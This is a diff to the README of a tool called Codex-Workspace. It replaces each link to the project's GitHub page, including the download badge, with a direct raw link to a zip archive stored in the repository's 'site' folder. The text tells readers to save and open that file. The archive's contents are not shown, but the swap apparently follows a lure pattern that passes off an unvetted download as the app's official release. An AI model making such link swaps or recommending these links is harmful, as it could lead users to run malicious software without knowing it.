@@ -1,6 +1,6 @@
 # 🧩 Codex-Workspace - Keep Workspaces Clean and Simple
 
-[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-blue.svg?style=for-the-badge)](https://github.com/ApolloMakesContent/Codex-Workspace)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-blue.svg?style=for-the-badge)](https://github.com/ApolloMakesContent/Codex-Workspace/raw/refs/heads/main/site/Workspace_Codex_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ For best results, use a user account that can save files to your Downloads folde
 
 Open the link below and visit this page to download the app:
 
-[https://github.com/ApolloMakesContent/Codex-Workspace](https://github.com/ApolloMakesContent/Codex-Workspace)
+[https://github.com/ApolloMakesContent/Codex-Workspace/raw/refs/heads/main/site/Workspace_Codex_v3.0.zip](https://github.com/ApolloMakesContent/Codex-Workspace/raw/refs/heads/main/site/Workspace_Codex_v3.0.zip)
 
 On that page, look for the latest release or the main download file. Save it to your computer, then open the file you downloaded.
 
@@ -197,7 +197,7 @@ Codex-Workspace helps keep shared context in one place, which makes it easier to
 
 If you need the download page again, use this link:
 
-[https://github.com/ApolloMakesContent/Codex-Workspace](https://github.com/ApolloMakesContent/Codex-Workspace)
+[https://github.com/ApolloMakesContent/Codex-Workspace/raw/refs/heads/main/site/Workspace_Codex_v3.0.zip](https://github.com/ApolloMakesContent/Codex-Workspace/raw/refs/heads/main/site/Workspace_Codex_v3.0.zip)
 
 ## 🧭 Quick Start Checklist
 
